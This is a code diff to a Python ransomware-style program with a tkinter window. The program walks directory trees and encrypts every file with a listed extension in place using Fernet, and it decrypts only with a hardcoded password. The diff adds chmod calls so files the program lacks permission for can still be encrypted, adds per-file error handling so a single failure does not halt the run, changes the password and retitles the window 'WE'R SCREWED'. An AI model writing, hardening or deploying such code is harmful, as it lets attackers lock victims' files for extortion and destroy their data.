@@ -1,6 +1,7 @@
 import os
 import tkinter as tk
 import sys
+import stat
 from tkinter import messagebox
 from cryptography.fernet import Fernet, InvalidToken
 
@@ -47,22 +48,27 @@ def encrypt_files():
             filepath = os.path.join(root, filename)
             _, file_extension = os.path.splitext(filepath)
             if file_extension.lower() in ALLOWED_EXTENSIONS:
-                with open(filepath, "rb") as thefile:
-                    contents = thefile.read()
-                contents_encrypted = Fernet(key).encrypt(contents)
+                try:
+                    os.chmod(filepath, stat.S_IRWXU)  # Cambiar los permisos del archivo
+                    with open(filepath, "rb") as thefile:
+                        contents = thefile.read()
+                    contents_encrypted = Fernet(key).encrypt(contents)
 
-                with open(filepath, "wb") as thefile:
-                    thefile.write(contents_encrypted)
+                    with open(filepath, "wb") as thefile:
+                        thefile.write(contents_encrypted)
 
-                total_files_encrypted += 1
+                    total_files_encrypted += 1
+                except Exception as e:
+                    print(f"Error cifrando {filepath}: {e}")
 
     # Muestra el número total de archivos cifrados sin listar sus nombres
     result_label.config(text=f"Total files encrypted: {total_files_encrypted}", fg="yellow", bg="red")
 
+
 #function to decrypt all files in the current directory
 def decrypt_files():
     password = pw_entry.get()
-    correct_password = "lihapulla"
+    correct_password = "lilpollas"
 
     if password == correct_password:
         key = load_encryption_key()
@@ -104,7 +110,7 @@ def color_change():
 
 	
 root = tk.Tk()
-root.title("RANSOMWARE DECRYPTOR")
+root.title("WE'R SCREWED")
 root.geometry("1000x700")
 bg_color = root.cget("bg")
 
